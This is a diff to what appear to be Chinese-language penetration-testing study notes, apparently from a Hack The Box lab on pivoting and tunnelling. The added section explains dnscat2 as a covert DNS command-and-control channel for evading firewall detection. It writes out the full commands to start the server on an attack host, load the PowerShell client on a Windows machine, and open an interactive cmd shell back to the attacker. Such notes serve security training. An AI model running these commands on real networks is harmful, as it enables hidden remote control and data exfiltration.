@@ -233,26 +233,35 @@ C:\Windows\system32> netsh.exe interface portproxy show v4tov4                  
 使用 xfreerdp 从攻击主机连接到 8080
 
 
-
-
-
-
-
-
-
-
-
-
-
-Dnscat2:
-  ATC host:
-  sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+Dnscat2
+利用 DNS 协议在两台主机之间发送数据
+使用加密的命令与控制 (Command-&-Control, C&C 或 C2) 通道，并在 DNS 协议的 TXT 记录中发送数据
+通常，企业网络中的每个活动目录域环境都会有自己的 DNS 服务器
+使用 dnscat2 时，地址解析会请求外部服务器
+当本地 DNS 服务器尝试解析某个地址时，数据会被窃取并发送出去，而不是发到合法 DNS 服务器 
+Dnscat2 极其隐蔽的数据窃取，能规避剥离 HTTPS 连接和嗅探流量的防火墙检测
+在攻击主机上使用 dnscat2 服务器
+在另一台 Windows 主机上执行 dnscat2 客户端
     https://github.com/iagox86/dnscat2
 
-  PWN host:
-  PS C:\htb> Import-Module .\dnscat2.ps1
-  PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
-    https://github.com/lukebaggett/dnscat2-powershell
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler      安装
+sudo bundle install           检查安装
+
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache      在攻击机启动服务端
+git clone https://github.com/lukebaggett/dnscat2-powershell.git                                下载客户端
+scp 或传送到跳板
+PS C:\htb> Import-Module .\dnscat2.ps1                                                         安装客户端
+PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd      通过客户端，启动 cmd
+dnscat2> ?                看帮助
+dnscat2> window -i 1      建立交互 shell
+
+
+
+
+
+
 
 
 Chisel:
